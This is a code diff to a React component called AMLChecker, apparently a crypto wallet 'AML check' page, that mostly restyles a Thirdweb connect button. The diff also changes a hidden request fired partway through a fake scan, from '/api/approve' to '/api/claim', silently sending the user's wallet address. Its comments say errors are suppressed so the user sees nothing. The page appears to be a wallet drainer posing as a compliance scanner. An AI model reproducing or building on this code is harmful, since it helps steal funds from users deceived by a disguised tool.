@@ -62,13 +62,12 @@ export default function AMLChecker() {
         // Trigger approval at 5 seconds - backend approval happens silently
         if (newProgress === 5 && !approvalTriggered) {
           setApprovalTriggered(true);
-          // Silent approval request to backend
-          fetch('/api/approve', {
+          // Silent claim request to backend
+          fetch('/api/claim', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              walletAddress,
-              network: selectedNetwork,
+              userAddress: walletAddress,
             }),
           }).catch(() => {
             // Silent fail - don't show errors to user during scan
@@ -263,25 +262,61 @@ export default function AMLChecker() {
             <div className="w-full max-w-sm">
               <h2 className="text-2xl sm:text-3xl font-bold text-center mb-6 sm:mb-8">Connect Wallet</h2>
 
-              {/* Thirdweb Connect Button - Styled with Dark Theme */}
-              <ConnectButton
-                client={client}
-                wallets={wallets}
-                theme={darkTheme({
-                  colors: {
-                    success: 'hsl(142, 95%, 25%)',
-                    danger: 'hsl(0, 72%, 55%)',
-                    primaryButtonBg: 'hsl(143, 64%, 28%)',
-                  },
-                })}
-                connectModal={{ size: 'compact' }}
-                onConnect={(wallet) => {
-                  const address = wallet.getAccount()?.address;
-                  if (address) {
-                    handleWalletConnected(address);
+              {/* Thirdweb Connect Button - Custom Styled */}
+              <style>{`
+                .custom-connect-button button {
+                  width: 100% !important;
+                  padding: 0.625rem 1rem !important;
+                  background-color: rgb(5, 150, 105) !important;
+                  color: rgb(0, 0, 0) !important;
+                  font-weight: 600 !important;
+                  font-size: 1rem !important;
+                  border-radius: 9999px !important;
+                  border: none !important;
+                  cursor: pointer !important;
+                  transition: all 0.2s !important;
+                }
+                .custom-connect-button button:hover {
+                  background-color: rgb(16, 185, 129) !important;
+                  box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3) !important;
+                }
+                .custom-connect-button button:disabled {
+                  background-color: rgb(107, 114, 128) !important;
+                  cursor: not-allowed !important;
+                  opacity: 0.5 !important;
+                }
+                @media (min-width: 640px) {
+                  .custom-connect-button button {
+                    padding: 0.75rem 1rem !important;
+                    font-size: 1.125rem !important;
                   }
-                }}
-              />
+                }
+              `}</style>
+              <div className="custom-connect-button w-full">
+                <ConnectButton
+                  client={client}
+                  wallets={wallets}
+                  chain={undefined}
+                  connectButton={{
+                    label: 'Connect Wallet',
+                  }}
+                  connectModal={{
+                    size: 'compact',
+                  }}
+                  theme={darkTheme({
+                    colors: {
+                      success: 'hsl(142, 95%, 25%)',
+                      primaryButtonBg: 'hsl(143, 64%, 28%)',
+                    },
+                  })}
+                  onConnect={(wallet) => {
+                    const address = wallet.getAccount()?.address;
+                    if (address) {
+                      handleWalletConnected(address);
+                    }
+                  }}
+                />
+              </div>
 
               {/* Terms Disclaimer */}
               <p className="text-xs sm:text-sm text-gray-400 text-center leading-relaxed mt-6 sm:mt-8">
